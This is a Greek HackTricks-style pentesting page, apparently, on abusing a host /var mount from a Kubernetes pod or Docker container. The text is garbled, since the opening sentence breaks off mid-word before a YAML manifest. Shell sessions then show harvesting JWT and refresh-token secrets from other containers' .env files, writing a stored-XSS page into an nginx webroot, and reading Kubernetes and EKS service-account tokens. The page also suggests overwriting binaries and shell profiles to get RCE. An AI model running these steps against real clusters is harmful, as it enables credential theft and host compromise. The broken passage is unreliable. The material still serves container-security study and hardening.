# Ευαίσθητοι Σύνδεσμοι

{{#include ../../../../banners/hacktricks-training.md}}

Η έκθεση των `/proc`, `/
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Μέσα στο **pod-mounts-var-folder** κοντέινερ:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
Το XSS επιτεύχθηκε:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Σημειώστε ότι το κοντέινερ ΔΕΝ απαιτεί επανεκκίνηση ή οτιδήποτε άλλο. Οποιεσδήποτε αλλαγές γίνουν μέσω του τοποθετημένου **/var** φακέλου θα εφαρμοστούν άμεσα.

Μπορείτε επίσης να αντικαταστήσετε αρχεία ρυθμίσεων, δυαδικά αρχεία, υπηρεσίες, αρχεία εφαρμογών και προφίλ shell για να επιτύχετε αυτόματη (ή ημι-αυτόματη) RCE.

##### Πρόσβαση σε διαπιστευτήρια cloud

Το κοντέινερ μπορεί να διαβάσει τα tokens serviceaccount K8s ή τα tokens webidentity AWS
που επιτρέπουν στο κοντέινερ να αποκτήσει μη εξουσιοδοτημένη πρόσβαση σε K8s ή cloud:
```bash
/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
#### Docker

Η εκμετάλλευση στο Docker (ή σε αναπτύξεις Docker Compose) είναι ακριβώς η ίδια, εκτός από το ότι συνήθως τα συστήματα αρχείων των άλλων κοντέινερ είναι διαθέσιμα κάτω από μια διαφορετική βασική διαδρομή:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Έτσι, τα συστήματα αρχείων βρίσκονται κάτω από `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Σημείωση

Οι πραγματικοί δρόμοι μπορεί να διαφέρουν σε διαφορετικές ρυθμίσεις, γι' αυτό ο καλύτερος τρόπος είναι να χρησιμοποιήσετε την εντολή **find** για να εντοπίσετε τα συστήματα αρχείων των άλλων κοντέινερ.

### Αναφορές

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
